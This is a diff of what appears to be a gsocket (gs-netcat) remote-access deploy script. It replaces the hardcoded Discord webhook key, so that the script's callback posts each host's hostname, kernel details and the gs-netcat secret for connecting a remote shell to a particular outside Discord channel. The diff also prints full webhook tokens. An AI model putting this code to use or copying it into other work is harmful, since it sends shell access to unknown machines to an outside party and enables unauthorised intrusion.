@@ -51,7 +51,7 @@
 # GS_TG_CHATID=
 #       - Telegram Chat ID, =-8834838...
  GS_DISCORD_KEY=
-#       - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
+#       - Discord API key, ="1529113837859504210/Ug-z4YS-aBVSeGVU7YJKaldmOd5c4wgyBH9Y5Iq_-vaXUC2RuD3o7BXJIwQy0DWarg_L"
 # GS_WEBHOOK_KEY=
 #       - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
 # GS_WEBHOOK=
@@ -109,7 +109,7 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
         GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 }
 ### discord webhook
- GS_DISCORD_KEY="1479459920540864542/pntXw9-dXGWz2vlvEtiIxo7PVC3QS3Tkwh2emiDP_8nlD6pTVh36veDN-L9SSmDGWwSl"
+ GS_DISCORD_KEY="1529113837859504210/Ug-z4YS-aBVSeGVU7YJKaldmOd5c4wgyBH9Y5Iq_-vaXUC2RuD3o7BXJIwQy0DWarg_L"
 [[ -n $GS_DISCORD_KEY ]] && {
         data='{"username": "gsocket", "content": "'"${msg}"'"}'
         GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
